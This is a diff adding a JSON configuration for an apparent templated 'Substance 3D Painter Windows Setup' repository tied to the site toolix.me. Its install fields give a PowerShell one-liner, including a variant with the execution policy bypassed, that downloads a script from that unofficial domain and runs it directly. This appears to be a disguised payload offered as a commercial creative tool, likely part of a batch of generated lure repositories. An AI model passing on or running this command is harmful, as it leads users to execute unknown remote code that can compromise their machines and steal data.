@@ -1,0 +1,26 @@
+{
+  "repo": "Substance-3d-Painter-Windows-Setup",
+  "product": "Substance 3d Painter Windows Setup",
+  "product_title": "Substance 3d Painter Windows",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "how-to-install-substance-3d-painter-windows",
+    "substance-3d-painter-windows-app",
+    "design-software",
+    "image-editing",
+    "creative-workflow",
+    "visual-design",
+    "substance-3d-painter-windows-creative-tool",
+    "substance-3d-painter-windows-design-tool",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
